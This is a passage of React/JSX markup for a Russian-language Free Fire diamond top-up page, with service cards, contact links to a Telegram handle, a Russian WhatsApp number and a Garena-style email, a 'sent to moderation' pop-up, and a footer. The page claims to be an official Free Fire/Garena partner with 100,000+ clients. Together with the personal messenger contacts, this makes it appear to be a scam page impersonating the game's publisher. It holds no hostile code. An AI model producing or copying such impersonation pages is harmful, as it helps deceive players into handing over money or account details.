              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-emerald-500/50 shadow-lg hover:shadow-emerald-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-emerald-600/10 to-green-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-emerald-500/20 to-green-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-emerald-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Гарантии</h3>
                  <ul className="space-y-3">
                    <li className="flex items-center gap-3 text-sm text-gray-400 bg-emerald-500/5 p-3 rounded-lg border border-emerald-500/10">
                      <div className="w-6 h-6 rounded-full bg-emerald-500/10 flex items-center justify-center text-xs text-emerald-400">1</div>
                      <span>Моментально</span>
                    </li>
                    <li className="flex items-center gap-3 text-sm text-gray-400 bg-green-500/5 p-3 rounded-lg border border-green-500/10">
                      <div className="w-6 h-6 rounded-full bg-green-500/10 flex items-center justify-center text-xs text-green-400">2</div>
                      <span>Поддержка 24/7</span>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* О сервисе */}
        <section id="about" className="container mx-auto px-4 mb-16">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-8 bg-gradient-to-r from-white to-yellow-400 bg-clip-text text-transparent">
            О сервисе
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
            <div className="relative group col-span-1 sm:col-span-2 lg:col-span-2">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-white/10 hover:border-indigo-500/50 shadow-lg hover:shadow-indigo-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-indigo-600/10 to-violet-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-indigo-500/20 to-violet-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-indigo-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Официальный сервис</h3>
                  <p className="text-sm text-gray-400 mb-4">Мы являемся официальным партнером Free Fire и предоставляем безопасный способ пополнения алмазов.</p>
                  <div className="flex flex-wrap gap-2">
                    <span className="px-3 py-1 rounded-full bg-indigo-500/10 text-indigo-400 text-xs font-medium">С 2020 года</span>
                    <span className="px-3 py-1 rounded-full bg-violet-500/10 text-violet-400 text-xs font-medium">100,000+ клиентов</span>
                  </div>
                </div>
              </div>
            </div>

            <div className="relative group">
              <div className="relative bg-[#1a1f2e] rounded-xl overflow-hidden transition-all duration-300 hover:scale-[1.02] border border-fuchsia-500/50 shadow-lg hover:shadow-fuchsia-500/20 p-6">
                <div className="absolute inset-0 bg-gradient-to-r from-fuchsia-600/10 to-pink-600/10 rounded-xl"></div>
                <div className="relative z-10">
                  <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-fuchsia-500/20 to-pink-500/20 flex items-center justify-center mb-4">
                    <svg className="w-6 h-6 text-fuchsia-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
                    </svg>
                  </div>
                  <h3 className="text-lg font-bold text-white mb-3">Статистика</h3>
                  <div className="space-y-3">
                    <div className="text-center p-3 bg-gradient-to-r from-fuchsia-500/5 to-pink-500/5 rounded-lg border border-fuchsia-500/10">
                      <div className="text-2xl font-bold text-fuchsia-400">1M+</div>
                      <div className="text-xs text-gray-400">Алмазов продано</div>
                    </div>
                    <div className="text-center p-3 bg-gradient-to-r from-pink-500/5 to-rose-500/5 rounded-lg border border-pink-500/10">
                      <div className="text-2xl font-bold text-pink-400">24/7</div>
                      <div className="text-xs text-gray-400">Поддержка</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Контакты */}
        <section id="contact" className="container mx-auto px-4 mb-16">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-8 bg-gradient-to-r from-white to-red-400 bg-clip-text text-transparent">
            Связаться с нами
          </h2>
          
          <div className="max-w-md mx-auto">
            <div className="relative bg-[#1a1f2e]/80 backdrop-blur-xl rounded-2xl overflow-hidden border border-white/10">
              {/* Декоративный фоновый градиент */}
              <div className="absolute inset-0 bg-gradient-to-b from-blue-500/10 via-purple-500/5 to-transparent"></div>
              
              <div className="relative flex flex-col divide-y divide-white/5">
                {/* Telegram */}
                <a href="https://t.me/garena_support" 
                   className="flex items-center gap-4 p-4 md:p-6 hover:bg-white/5 transition-colors"
                >
                  <div className="w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl bg-[#2b3544] flex items-center justify-center shrink-0">
                    <svg className="w-5 h-5 md:w-6 md:h-6 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-base md:text-lg font-medium text-white">Telegram</h3>
                    <p className="text-sm md:text-base text-gray-400 truncate">@garena_support</p>
                  </div>
                  <svg className="w-4 h-4 md:w-5 md:h-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </a>

                {/* WhatsApp */}
                <a href="https://wa.me/79993993233" 
                   className="flex items-center gap-4 p-4 md:p-6 hover:bg-white/5 transition-colors"
                >
                  <div className="w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl bg-[#2b3544] flex items-center justify-center shrink-0">
                    <svg className="w-5 h-5 md:w-6 md:h-6 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-base md:text-lg font-medium text-white">WhatsApp</h3>
                    <p className="text-sm md:text-base text-gray-400 truncate">+7 999 399 32 33</p>
                  </div>
                  <svg className="w-4 h-4 md:w-5 md:h-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </a>

                {/* Email */}
                <a href="mailto:garena.support@freefire.com" 
                   className="flex items-center gap-4 p-4 md:p-6 hover:bg-white/5 transition-colors"
                >
                  <div className="w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl bg-[#2b3544] flex items-center justify-center shrink-0">
                    <svg className="w-5 h-5 md:w-6 md:h-6 text-red-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <h3 className="text-base md:text-lg font-medium text-white">Email</h3>
                    <p className="text-sm md:text-base text-gray-400 truncate">garena.support@freefire.com</p>
                  </div>
                  <svg className="w-4 h-4 md:w-5 md:h-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </a>
              </div>

              {/* Дополнительная информация */}
              <div className="p-4 md:p-6 bg-[#1a1f2e] border-t border-white/5">
                <div className="flex items-center gap-3">
                  <div className="w-2.5 h-2.5 md:w-3 md:h-3 bg-green-500 rounded-full animate-pulse"></div>
                  <div>
                    <p className="text-sm md:text-base text-white font-medium">Онлайн поддержка</p>
                    <p className="text-xs md:text-sm text-gray-400">Среднее время ответа 5 минут</p>
                  </div>
                </div>
                <div className="flex gap-2 mt-3 md:mt-4">
                  <span className="px-2.5 py-1 md:px-3 md:py-1 rounded-full bg-white/5 text-xs md:text-sm text-gray-400">24/7</span>
                  <span className="px-2.5 py-1 md:px-3 md:py-1 rounded-full bg-white/5 text-xs md:text-sm text-gray-400">Русский</span>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* Нижний баннер с информацией */}
        <div className="container mx-auto px-4 mb-8">
          <div className="bg-gradient-to-r from-blue-600/20 to-purple-600/20 rounded-2xl p-6 md:p-8 backdrop-blur-sm border border-white/5">
            <div className="flex flex-col md:flex-row items-center justify-between gap-6">
              <div className="text-center md:text-left">
                <h3 className="text-2xl font-bold text-white mb-2">Нужна помощь?</h3>
                <p className="text-gray-400">Наша служба поддержки работает 24/7. Мы всегда готовы помочь вам!</p>
              </div>
              <div className="flex flex-col sm:flex-row gap-4 w-full md:w-auto">
                <a 
                  href="#rules" 
                  className="w-full md:w-auto bg-white/10 hover:bg-white/20 text-white px-6 py-3 rounded-xl transition-all duration-300 text-center flex items-center justify-center gap-2"
                >
                  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                  </svg>
                  Правила сервиса
                </a>
                <button 
                  onClick={() => setIsSupportModalOpen(true)}
                  className="w-full md:w-auto bg-gradient-to-r from-purple-600 to-blue-600 hover:opacity-90 text-white px-6 py-3 rounded-xl transition-all duration-300 text-center flex items-center justify-center gap-2"
                >
                  <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
                  </svg>
                  Написать в поддержку
                </button>
              </div>
            </div>
          </div>
        </div>

        {moderationMessage && (
          <div className="fixed bottom-4 right-4 left-4 md:bottom-8 md:right-8 md:left-auto z-50 animate-slideIn">
            <div className="relative bg-gradient-to-r from-purple-600/90 to-blue-600/90 backdrop-blur-lg rounded-2xl p-4 md:p-6 shadow-2xl max-w-md mx-auto md:mx-0">
              <div className="absolute -top-3 -right-3 w-8 h-8 bg-yellow-500 rounded-full flex items-center justify-center shadow-lg">
                <span className="text-xl">✨</span>
              </div>
              
              <h3 className="text-lg md:text-xl font-bold text-white mb-2 flex items-center gap-2">
                <span className="text-xl md:text-2xl">🎮</span>
                Заявка отправлена!
              </h3>
              
              <p className="text-sm md:text-base text-white/90 mb-4">
                Ваша заявка успешно отправлена на модерацию. Мы уведомим вас о статусе в ближайшее время.
              </p>
              
              <div className="w-full h-1.5 bg-white/20 rounded-full overflow-hidden">
                <div className="h-full w-2/3 bg-gradient-to-r from-yellow-500 to-yellow-300 rounded-full animate-pulse"></div>
              </div>
              
              <div className="mt-4 text-xs md:text-sm text-white/70 flex items-center gap-2">
                <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                Ожидает подтверждения модератора
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className="bg-black/20 backdrop-blur-sm py-6 md:py-8">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 md:gap-8">
            <div className="text-center md:text-left">
              <h4 className="text-white font-bold mb-3">О сервисе</h4>
              <p className="text-sm text-gray-400">Официальный сервис пополнения алмазов для Free Fire</p>
            </div>
            <div className="text-center md:text-left">
              <h4 className="text-white font-bold mb-3">Поддержка</h4>
              <ul className="text-sm text-gray-400 space-y-2">
                <li>Часто задаваемые вопросы</li>
                <li>Служба поддержки Garena</li>
                <li>Правила сервиса</li>
              </ul>
            </div>
            <div className="text-center md:text-left">
              <h4 className="text-white font-bold mb-3">Контакты</h4>
              <ul className="text-sm text-gray-400 space-y-2">
                <li>Email: garena.support@freefire.com</li>
                <li>Telegram: @garena_support</li>
                <li>WhatsApp: +7 999 399 32 33</li>
              </ul>
            </div>
          </div>
          <div className="border-t border-white/10 mt-6 pt-6 text-center">
            <p className="text-sm text-gray-400">© 2024 Free Fire Diamonds. Все права защищены.</p>
          </div>
        </div>
      </footer>
    </main>
  );
} 